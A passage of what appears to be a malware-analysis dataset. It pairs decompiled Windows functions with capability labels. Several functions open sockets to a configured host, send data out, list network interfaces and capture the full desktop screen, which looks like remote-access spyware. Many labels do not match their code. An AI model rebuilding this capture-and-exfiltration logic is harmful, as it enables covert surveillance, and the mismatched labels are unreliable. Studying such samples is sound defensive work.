var_5ch;\n            var_ch = 0x466ad4;\n            var_10h = 0x466b08;\n            var_14h = 0x466a9c;\n            var_18h = 0x466ad4;\n            var_1ch = 0x466af0;\n            var_20h = 0x466afc;\n            fcn.00405800();\n            var_1ch = var_1ch + 1;\n        } while (var_50h != 1);\n    }\n    fcn.00420fe4();\n    (**(*var_18h + 0x44))();\n    fcn.00421014();\n    fcn.00421158();\n    fcn.0042164c();\n    var_30h = (**(*var_18h + 0x14))();\n    if (-1 < var_30h + -1) {\n        var_1ch = 0;\n        do {\n            fcn.00420fe4();\n            (**(*var_18h + 0xc))();\n            fcn.00405784();\n            fcn.00421158();\n            fcn.00421714();\n            var_20h = (**(*piVar1 + 0x54))();\n            (**(*piVar1 + 0x54))();\n            iVar2 = (**(*piVar1 + 0x54))();\n            (**(*piVar1 + 0x54))();\n            if ((var_20h != -1) && (iVar2 != -1)) {\n                (**(*var_18h + 0xc))(var_ch);\n                (**(*piVar1 + 0xc))(0x466ad4, var_6ch);\n                fcn.004218dc();\n                var_30h = var_70h;\n                (**(*piVar1 + 0xc))(0x466ad4);\n                fcn.004218dc();\n                (**(*piVar1 + 0xc))(0x466ad4, var_78h);\n                fcn.004218dc();\n                (**(*piVar1 + 0xc))(0x466bd0, var_80h);\n                var_14h = 0x466848;\n                fcn.004218dc();\n                var_14h = var_88h;\n                var_18h = 0x466ad4;\n                var_1ch = 0x466bdc;\n                var_20h = 0x466afc;\n                fcn.00405800();\n            }\n            var_1ch = var_1ch + 1;\n            var_30h = var_30h + -1;\n        } while (var_30h != 0);\n    }\n    fcn.00420fe4();\n    (**(*var_18h + 0x44))();\n    (**(*piVar1 + 0x44))();\n    fcn.00421014();\n    fcn.00421158();\n    fcn.0042164c();\n    var_30h = (**(*var_18h + 0x14))();\n    if (-1 < var_30h + -1) {\n        var_1ch = 0;\n        do {\n            fcn.00420fe4();\n            (**(*var_18h + 0xc))();\n            fcn.00405784();\n            fcn.00421158();\n            fcn.00421714();\n            var_20h = (**(*piVar1 + 0x54))();\n            (**(*piVar1 + 0x54))();\n            iVar2 = (**(*piVar1 + 0x54))();\n            if ((var_20h != -1) && (iVar2 != -1)) {\n                (**(*var_18h + 0xc))(var_10h);\n                (**(*piVar1 + 0xc))(0x466ad4, var_98h);\n                fcn.004218dc();\n                var_30h = var_9ch;\n                (**(*piVar1 + 0xc))(0x466ad4);\n                fcn.004218dc();\n                (**(*piVar1 + 0xc))(0x466ad4, var_a4h);\n                var_14h = 0x4669fb;\n                fcn.004218dc();\n                var_14h = var_ach;\n                var_18h = 0x466ad4;\n                var_1ch = 0x466bdc;\n                var_20h = 0x466afc;\n                fcn.00405800();\n            }\n            var_1ch = var_1ch + 1;\n            var_30h = var_30h + -1;\n        } while (var_30h != 0);\n    }\n    iVar2 = var_10h;\n    fcn.00405800(var_10h, var_ch, var_8h, var_4h);\n    fcn.00404640();\n    fcn.00404640();\n    fcn.00404640();\n    *in_FS_OFFSET = iVar2;\n    fcn.00405490(0x466a8a);\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 2363
    },
    "0046883c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool fcn.0046883c(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uchar auStack324 [320];\n    \n    uVar1 = fcn.004058fc(auStack324);\n    iVar2 = sub.kernel32.dll_FindFirstFileA_1(uVar1);\n    if (iVar2 != -1) {\n        sub.kernel32.dll_FindClose_1(iVar2);\n    }\n    return iVar2 != -1;\n}\n",
        "token_count": 102
    },
    "0046f264": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.0046f264(void)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_fffff7bc;\n    int32_t iStack2088;\n    uint uStack2084;\n    uchar *puStack2080;\n    uint uStack2076;\n    uint uStack2072;\n    uint uStack2068;\n    uint uStack2064;\n    uint *puStack2060;\n    int32_t iStack2056;\n    uint uStack2052;\n    uchar *puStack2048;\n    uint var_7ech;\n    uint var_7e8h;\n    uint var_7e4h;\n    uint var_1ach;\n    int32_t in;\n    uint uStack424;\n    uint uStack420;\n    uint lpWSAData;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t s;\n    \n    puStack2048 = &stack0xfffffffc;\n    uStack2052 = 0x46f3be;\n    iStack2056 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffff7f8;\n    puStack2060 = 0x46f291;\n    fcn.0040546c();\n    puStack2060 = &fcn.0046f264::lpWSAData;\n    uStack2064 = 0x101;\n    uStack2068 = 0x46f2a2;\n    sub.wsock32.dll_WSAStartup();\n    uStack2068 = 0;\n    uStack2072 = 1;\n    uStack2076 = 2;\n    puStack2080 = 0x46f2ad;\n    iVar1 = sub.wsock32.dll_socket();\n    s = iVar1;\n    if (iVar1 != -1) {\n        uStack2084 = 0x46f38b;\n        iStack2088 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffff7d8;\n        puStack2080 = &stack0xfffffffc;\n        iVar2 = sub.WS2_32.DLL_WSAIoctl\n                          (iVar1, 0x4004747f, 0, 0, &fcn.0046f264::var_7e8h, 0x400, &fcn.0046f264::var_8h, 0, 0);\n        if ((iVar2 != -1) && (-1 < var_8h / 0x4c + -1)) {\n            var_ch = var_8h / 0x4c;\n            puVar3 = &fcn.0046f264::var_7e4h;\n            do {\n                var_1ach = *puVar3;\n                in = puVar3[1];\n                uStack424 = puVar3[2];\n                uStack420 = puVar3[3];\n                sub.wsock32.dll_inet_ntoa(puVar3[1]);\n                fcn.00405664();\n                fcn.00405738();\n                var_1ach = puVar3[0xc];\n                in = puVar3[0xd];\n                uStack424 = puVar3[0xe];\n                uStack420 = puVar3[0xf];\n                var_1ach = puVar3[6];\n                iVar1 = puVar3[7];\n                in = iVar1;\n                uStack424 = puVar3[8];\n                uStack420 = puVar3[9];\n                sub.wsock32.dll_inet_ntoa(in_EAX);\n                fcn.00405738();\n                puVar3 = puVar3 + 0x13;\n                var_ch = var_ch + -1;\n            } while (var_ch != 0);\n        }\n        *in_FS_OFFSET = iVar1;\n        in_stack_fffff7bc = s;\n        sub.wsock32.dll_closesocket();\n        sub.wsock32.dll_WSACleanup();\n    }\n    *in_FS_OFFSET = in_stack_fffff7bc;\n    fcn.0040546c(0x46f3c5);\n    return;\n}\n",
        "token_count": 921
    },
    "00471b64": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00471b64(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x471b74;\n    fcn.004058ec();\n    uStack20 = 0x471bb5;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    uVar1 = fcn.004058fc();\n    sub.kernel32.dll_GetFileAttributesA();\n    *in_FS_OFFSET = uVar1;\n    uStack20 = 0x471bbc;\n    uStack24 = 0x471bb4;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 186
    },
    "0047ecf0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0047ecf0(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_fffffde8;\n    int32_t iStack448;\n    uint uStack444;\n    uchar *puStack440;\n    uint var_1a8h;\n    uint var_1a4h;\n    uint name;\n    uint var_19ch;\n    uint lpWSAData;\n    \n    puStack440 = &stack0xfffffffc;\n    uStack444 = 0x47ee45;\n    iStack448 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack448;\n    iVar1 = sub.wsock32.dll_WSAStartup(2, &lpWSAData);\n    if (iVar1 == 0) {\n        *0x498994 = sub.wsock32.dll_socket(2, 1, 0);\n        if (*0x498994 == -1) {\n            sub.wsock32.dll_WSACleanup();\n        }\n        else {\n            name._0_2_ = 2;\n            name._2_2_ = sub.wsock32.dll_htons(**0x4927c0);\n            uVar2 = fcn.00489450();\n            var_19ch = sub.wsock32.dll_inet_addr(uVar2);\n            sub.wsock32.dll_connect(*0x498994, &name, 0x10);\n            sub.wsock32.dll_recv(*0x498994, 0x498998, 0x1000, 0);\n            fcn.00403aac();\n            fcn.00409ce8(0x47ee5c);\n            fcn.00405800(0x47ee7c, 0x47ee70, 0);\n            fcn.00472bec();\n            in_stack_fffffde8 = *0x498994;\n            sub.wsock32.dll_recv(*0x498994, 0x498998, 0x1000, 0);\n            fcn.00403aac();\n        }\n    }\n    *in_FS_OFFSET = in_stack_fffffde8;\n    fcn.00405490(0x47ee4c);\n    return;\n}\n",
        "token_count": 497
    },
    "0047fa70": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.0047fa70(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uchar auStack372 [8];\n    uint uStack364;\n    uint uStack360;\n    uint *puStack356;\n    uint uStack352;\n    uint uStack348;\n    uchar *puStack344;\n    uint var_150h;\n    uint var_134h;\n    uint var_130h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack344 = 0x47fa84;\n    fcn.004058ec();\n    uStack348 = 0x47fb22;\n    uStack352 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffea0;\n    puStack356 = &fcn.0047fa70::var_150h;\n    uStack360 = 0x47faa1;\n    puStack344 = &stack0xfffffffc;\n    uStack360 = fcn.004058fc();\n    uStack364 = 0x47faa7;\n    iVar2 = sub.kernel32.dll_FindFirstFileA_1();\n    if (iVar2 == -1) {\n        var_10h = 0;\n        var_ch = 0;\n        *in_FS_OFFSET = uStack360;\n        uStack352 = 0x47fb29;\n        puStack356 = 0x47fb21;\n        fcn.0040546c();\n        return;\n    }\n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe8c;\n    *in_FS_OFFSET = uVar1;\n    return;\n}\n",
        "token_count": 368
    },
    "0048134c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0048134c noreturn (int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack476;\n    uint uStack472;\n    uchar *puStack468;\n    uint uStack464;\n    uint uStack460;\n    uchar *puStack456;\n    uint var_1b4h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_1a8h;\n    uint var_19ch;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack468 = &stack0xfffffffc;\n    var_4h = 0;\n    puStack456 = 0x48137a;\n    fcn.00405f08();\n    uStack460 = 0x4814e3;\n    uStack464 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe30;\n    uStack472 = 0x481499;\n    uStack476 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe24;\n    puStack456 = &stack0xfffffffc;\n    fcn.0040858c();\n    fcn.00405504();\n    uVar2 = *(arg_8h + 4);\n    fcn.00403aac();\n    iVar1 = sub.wsock32.dll_WSAStartup(2, &fcn.0048134c::var_19ch);\n    if (iVar1 != 0) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread(0);\n    }\n    iVar1 = sub.wsock32.dll_socket(2, 1, 0);\n    if (iVar1 == -1) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread(0);\n    }\n    var_1ach._0_2_ = 2;\n    var_1ach._2_2_ = sub.wsock32.dll_htons(uVar2);\n    fcn.004058fc();\n    uVar2 = fcn.00489450();\n    var_1a8h = sub.wsock32.dll_inet_addr(uVar2);\n    iVar3 = sub.wsock32.dll_connect(iVar1, &fcn.0048134c::var_1ach, 0x10);\n    if (iVar3 == 0) {\n        fcn.00409ce8(0x481510, var_4h, 0x4814fc);\n        fcn.00405800(0);\n        fcn.00472b58();\n        sub.wsock32.dll_closesocket(iVar1);\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread(0);\n    }\n    sub.wsock32.dll_closesocket(iVar1);\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread(0);\n}\n",
        "token_count": 661
    },
    "00481774": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00481774(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_fffffdec;\n    int32_t iStack444;\n    uint uStack440;\n    uchar *puStack436;\n    uint var_1a8h;\n    uint var_1a4h;\n    uint name;\n    uint var_19ch;\n    uint lpWSAData;\n    \n    puStack436 = &stack0xfffffffc;\n    uStack440 = 0x4818d5;\n    iStack444 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack444;\n    iVar1 = sub.wsock32.dll_WSAStartup(2, &lpWSAData);\n    if (iVar1 == 0) {\n        *0x49eb88 = sub.wsock32.dll_socket(2, 1, 0);\n        if (*0x49eb88 == -1) {\n            sub.wsock32.dll_WSACleanup();\n            **0x4927dc = 0;\n        }\n        else {\n            name._0_2_ = 2;\n            name._2_2_ = sub.wsock32.dll_htons(**0x4927c0);\n            uVar2 = fcn.00489450();\n            var_19ch = sub.wsock32.dll_inet_addr(uVar2);\n            sub.wsock32.dll_connect(*0x49eb88, &name, 0x10);\n            sub.wsock32.dll_recv(*0x49eb88, 0x49bb80, 0x1000, 0);\n            fcn.00403aac();\n            fcn.00409ce8(0x4818ec);\n            fcn.00405800(0x481908, 0x4818fc, 0);\n            fcn.00472bec();\n            in_stack_fffffdec = *0x49eb88;\n            sub.wsock32.dll_recv(*0x49eb88, 0x49bb80, 0x1000, 0);\n            fcn.00403aac();\n        }\n    }\n    else {\n        **0x4927dc = 0;\n    }\n    *in_FS_OFFSET = in_stack_fffffdec;\n    fcn.00405490(0x4818dc);\n    return;\n}\n",
        "token_count": 524
    },
    "00485178": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00485178 noreturn (uint arg_8h)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint *in_FS_OFFSET;\n    uint auStackY8248 [867];\n    uint uStackY4780;\n    uint uStackY4776;\n    int32_t iStackY4772;\n    uint uStack4628;\n    uint uStack4624;\n    uchar *puStack4620;\n    uint uStack4616;\n    uint uStack4612;\n    uchar *puStack4608;\n    uint var_34h;\n    uint var_30h;\n    uint var_28h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack4620 = &stack0xfffffffc;\n    iVar2 = 3;\n    do {\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    puStack4608 = 0x4851d1;\n    fcn.00405f08();\n    uStack4612 = 0x4854fb;\n    uStack4616 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffedf8;\n    uStack4624 = 0x4854a0;\n    uStack4628 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffedec;\n    puStack4608 = &stack0xfffffffc;\n    piVar3 = fcn.0041bf4c();\n    fcn.0040858c();\n    fcn.00405504();\n    fcn.00405504();\n    fcn.00405504();\n    fcn.00405504();\n    fcn.00405504();\n    fcn.00469650();\n    fcn.00405504();\n    fcn.0041c068();\n    iVar2 = sub.wsock32.dll_WSAStartup();\n    if (iVar2 != 0) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread();\n    }\n    iVar2 = sub.wsock32.dll_socket();\n    if (iVar2 == -1) {\n        sub.wsock32.dll_WSACleanup();\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread();\n    }\n    sub.wsock32.dll_htons();\n    fcn.00489450();\n    sub.wsock32.dll_inet_addr();\n    sub.wsock32.dll_connect();\n    sub.wsock32.dll_recv();\n    fcn.00403aac();\n    fcn.00405800();\n    fcn.00472bec();\n    sub.wsock32.dll_recv();\n    fcn.00403aac();\n    iVar1 = (***piVar3)();\n    fcn.0040b6c4(SUB104(iVar1, 0));\n    fcn.00405784();\n    fcn.00472bec();\n    sub.wsock32.dll_recv();\n    fcn.00403aac();\n    fcn.00403aac();\n    puVar5 = 0x485540;\n    puVar6 = &stack0xffffdfc8;\n    for (iVar4 = 0x800; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar6 = puVar6 + 1;\n    }\n    iStackY4772 = 0x48542b;\n    fcn.0041b674(0, 0);\n    do {\n        iStackY4772 = 0x48543a;\n        iVar4 = (**(*piVar3 + 0xc))();\n        if (iVar4 == 0) break;\n        sub.wsock32.dll_send();\n        fcn.00403aac();\n        iStackY4772 = 0x48546c;\n        sub.wsock32.dll_recv();\n        iStackY4772 = 0x48547a;\n        fcn.00403aac();\n    } while (iVar4 != 0);\n    uStackY4776 = 0x485487;\n    iStackY4772 = iVar2;\n    sub.wsock32.dll_closesocket();\n    uStackY4776 = 0x48548f;\n    fcn.00404640();\n    uStackY4776 = 0;\n    // WARNING: Subroutine does not return\n    uStackY4780 = 0x485496;\n    sub.kernel32.dll_ExitThread();\n}\n",
        "token_count": 1024
    },
    "00488240": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00488240(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    ushort uStack12744;\n    ushort uStack12742;\n    uint uStack12740;\n    uchar auStack12728 [7992];\n    uint uStack4736;\n    uint uStack4732;\n    uint uStack4728;\n    uint uStack4724;\n    uint uStack4720;\n    uint uStack4716;\n    uint uStack4712;\n    uint uStack4708;\n    uint uStack4704;\n    uint uStack4700;\n    uint uStack4696;\n    uint uStack4692;\n    uint uStack4688;\n    uint uStack4684;\n    uint uStack4680;\n    uint uStack4676;\n    uint uStack4672;\n    uchar *puStack4668;\n    int32_t iStack4664;\n    uint *puStack4660;\n    uint uStack4656;\n    uint uStack4652;\n    int32_t iStack4648;\n    uint *puStack4644;\n    uint uStack4640;\n    uint uStack4636;\n    int32_t iStack4632;\n    uchar *puStack4628;\n    uint uStack4624;\n    uint uStack4620;\n    uint32_t uStack4616;\n    uint uStack4612;\n    uint uStack4608;\n    uint uStack4604;\n    uint uStack4600;\n    uchar *puStack4596;\n    uint uStack4592;\n    uint uStack4588;\n    uchar *puStack4584;\n    uint uStack4580;\n    uint uStack4576;\n    uchar *puStack4572;\n    uint var_1024h;\n    uint var_24h;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack4584 = &stack0xfffffffc;\n    iVar1 = 3;\n    do {\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    var_4h = 0;\n    puStack4572 = 0x48827b;\n    fcn.00405f08();\n    uStack4576 = 0x4885cb;\n    uStack4580 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffee1c;\n    uStack4588 = 0x48856a;\n    uStack4592 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffee10;\n    puStack4596 = 0x4882a6;\n    puStack4572 = &stack0xfffffffc;\n    fcn.0040858c();\n    puStack4596 = 0x4882b0;\n    fcn.00405504();\n    puStack4596 = &stack0xffffce48;\n    uStack4600 = 2;\n    uStack4604 = 0x4882be;\n    iVar1 = sub.wsock32.dll_WSAStartup();\n    if (iVar1 != 0) {\n        uStack4604 = 0;\n    // WARNING: Subroutine does not return\n        uStack4608 = 0x4882c9;\n        sub.kernel32.dll_ExitThread();\n    }\n    uStack4604 = 0;\n    uStack4608 = 1;\n    uStack4612 = 2;\n    uStack4616 = 0x4882d4;\n    var_10h = sub.wsock32.dll_socket();\n    if (var_10h == -1) {\n        uStack4616 = 0x4882e2;\n        sub.wsock32.dll_WSACleanup();\n        uStack4616 = 0;\n    // WARNING: Subroutine does not return\n        uStack4620 = 0x4882e9;\n        sub.kernel32.dll_ExitThread();\n    }\n    uStack12744 = 2;\n    uStack4616 = **0x4927c0;\n    uStack4620 = 0x488300;\n    uStack12742 = sub.wsock32.dll_htons();\n    uStack4620 = 0x488313;\n    uStack4620 = fcn.00489450();\n    uStack4624 = 0x488319;\n    uStack12740 = sub.wsock32.dll_inet_addr();\n    uStack4624 = 0x10;\n    puStack4628 = &stack0xffffce38;\n    iStack4632 = var_10h;\n    uStack4636 = 0x488331;\n    sub.wsock32.dll_connect();\n    uStack4636 = 0;\n    uStack4640 = 0x1000;\n    puStack4644 = &fcn.00488240::var_1024h;\n    iStack4648 = var_10h;\n    uStack4652 = 0x488348;\n    sub.wsock32.dll_recv();\n    uStack4652 = 0x48835a;\n    fcn.00403aac();\n    uStack4652 = 0x48836d;\n    fcn.00405784();\n    uStack4652 = 0x48837b;\n    fcn.00472bec();\n    uStack4652 = 0;\n    uStack4656 = 0x1000;\n    puStack4660 = &fcn.00488240::var_1024h;\n    iStack4664 = var_10h;\n    puStack4668 = 0x488392;\n    sub.wsock32.dll_recv();\n    puStack4668 = 0x4883a4;\n    fcn.00403aac();\n    puStack4668 = 0x4883b0;\n    var_14h = fcn.00404610();\n    puStack4668 = 0x4883bf;\n    var_18h = fcn.00404610();\n    puStack4668 = 0x4883d4;\n    fcn.00403aac();\n    puStack4668 = 0x4883e0;\n    var_1ch = fcn.00428b88();\n    uStack4672 = 0x488484;\n    uStack4676 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffedbc;\n    uStack4680 = 0x4883f6;\n    puStack4668 = &stack0xfffffffc;\n    uStack4680 = sub.user32.dll_GetDesktopWindow();\n    uStack4684 = 0x488402;\n    var_20h = uStack4680;\n    uStack4688 = sub.user32.dll_GetDC();\n    uStack4684 = 8;\n    uStack4692 = 0x488410;\n    var_24h = uStack4688;\n    sub.gdi32.dll_GetDeviceCaps();\n    uStack4692 = 10;\n    uStack4696 = var_24h;\n    uStack4700 = 0x48841d;\n    sub.gdi32.dll_GetDeviceCaps();\n    uStack4700 = 0x488429;\n    (**(*var_1ch + 0x40))();\n    uStack4700 = 0x488433;\n    (**(*var_1ch + 0x34))();\n    uStack4700 = 0xcc0020;\n    uStack4704 = 0;\n    uStack4708 = 0;\n    uStack4712 = var_24h;\n    uStack4716 = 0x488448;\n    uStack4716 = (**(*var_1ch + 0x20))();\n    uStack4720 = 0x488451;\n    uStack4720 = (**(*var_1ch + 0x2c))();\n    uStack4724 = 0;\n    uStack4728 = 0;\n    uStack4732 = 0x48845e;\n    fcn.0042915c();\n    uStack4732 = 0x488463;\n    uStack4732 = fcn.00424ec0();\n    uStack4736 = 0x488469;\n    sub.gdi32.dll_BitBlt();\n    *in_FS_OFFSET = uStack4732;\n    uStack4724 = 0x48848b;\n    uStack4728 = var_24h;\n    uStack4732 = var_20h;\n    uStack4736 = 0x488483;\n    sub.user32.dll_ReleaseDC();\n    return;\n}\n",
        "token_count": 1880
    },
    "00488f70": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00488f70(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uchar auStack372 [8];\n    uint uStack364;\n    uint uStack360;\n    uint *puStack356;\n    uint uStack352;\n    uint uStack348;\n    uchar *puStack344;\n    uint var_150h;\n    uint var_134h;\n    uint var_130h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack344 = 0x488f84;\n    fcn.004058ec();\n    uStack348 = 0x489022;\n    uStack352 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffea0;\n    puStack356 = &fcn.00488f70::var_150h;\n    uStack360 = 0x488fa1;\n    puStack344 = &stack0xfffffffc;\n    uStack360 = fcn.004058fc();\n    uStack364 = 0x488fa7;\n    iVar2 = sub.kernel32.dll_FindFirstFileA_1();\n    if (iVar2 == -1) {\n        var_10h = 0;\n        var_ch = 0;\n        *in_FS_OFFSET = uStack360;\n        uStack352 = 0x489029;\n        puStack356 = 0x489021;\n        fcn.0040546c();\n        return;\n    }\n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe8c;\n    *in_FS_OFFSET = uVar1;\n    return;\n}\n",
        "token_count": 363
    },
    "00404408": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint fcn.00404408(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    \n    uVar3 = 0;\n    iVar1 = sub.user32.dll_GetKeyboardType(0);\n    if (iVar1 == 7) {\n        uVar2 = sub.user32.dll_GetKeyboardType(1);\n        if (((uVar2 & 0xff00) == 0xd00) || ((uVar2 & 0xff00) == 0x400)) {\n            uVar3 = 1;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 135
    },
    "00404914": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00404914(uint param_1, uint8_t *param_2)\n\n{\n    uint16_t *puVar1;\n    int32_t *in_EAX;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    \n    uVar3 = 0;\n    uVar6 = 0;\n    uVar4 = *param_2;\n    piVar2 = in_EAX;\n    do {\n        puVar1 = *(*piVar2 + -0x38);\n        if (puVar1 != NULL) {\n            uVar6 = uVar6 & 0xffff0000 | *puVar1;\n            piVar5 = puVar1 + 3;\n            do {\n                uVar3 = uVar3 & 0xffffff00 | *(piVar5 + 6);\n                if (*(piVar5 + 6) == uVar4) {\n                    while (((*(uVar3 + 6 + piVar5) ^ param_2[uVar3]) & 0xdf) == 0) {\n                        uVar3 = uVar3 - 1;\n                        if (uVar3 == 0) {\n                            piVar2 = *piVar5 + in_EAX;\n                            goto code_r0x00404960;\n                        }\n                    }\n                    uVar4 = *param_2;\n                    uVar3 = uVar3 & 0xffffff00 | *(piVar5 + 6);\n                }\n                piVar5 = uVar3 + 7 + piVar5;\n                uVar6 = uVar6 - 1;\n            } while (uVar6 != 0);\n        }\n        piVar2 = *(*piVar2 + -0x24);\n    } while (piVar2 != NULL);\ncode_r0x00404960:\n    return CONCAT44(in_EAX, piVar2);\n}\n",
        "token_count": 426
    },
    "004098cc": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004098cc(uint32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    bool bVar7;\n    \n    uVar2 = param_1 ^ 0xffffffff;\n    iVar1 = in_EAX + param_1 + -8;\n    iVar5 = param_2 + param_1 + -8;\n    iVar3 = uVar2 + 9;\n    if (iVar3 == 0 || SCARRY4(uVar2, 9) != iVar3 < 0) {\n        if (*(iVar3 + iVar1) != *(iVar3 + iVar5)) {\n            return 0;\n        }\n        uVar6 = iVar3 + iVar1 & 3;\n        iVar3 = (uVar2 + 0xd) - uVar6;\n        iVar4 = iVar3;\n        if (iVar3 == 0 || uVar2 + 0xd < uVar6) {\n            do {\n                if (*(iVar4 + iVar1) != *(iVar4 + iVar5)) {\n                    return 0;\n                }\n                if (*(iVar4 + 4 + iVar1) != *(iVar4 + 4 + iVar5)) {\n                    return 0;\n                }\n                iVar3 = iVar4 + 8;\n                if (iVar3 != 0 && SCARRY4(iVar4, 8) == iVar3 < 0) break;\n                if (*(iVar3 + iVar1) != *(iVar3 + iVar5)) {\n                    return 0;\n                }\n                if (*(iVar4 + 0xc + iVar1) != *(iVar4 + 0xc + iVar5)) {\n                    return 0;\n                }\n                bVar7 = SCARRY4(iVar3, 8);\n                iVar3 = iVar4 + 0x10;\n                iVar4 = iVar3;\n            } while (iVar3 == 0 || bVar7 != iVar3 < 0);\n        }\n    }\n    if (iVar3 < 5) {\n        if (*(iVar3 + iVar1) != *(iVar3 + iVar5)) {\n            return 0;\n        }\n        iVar3 = iVar3 + 4;\n    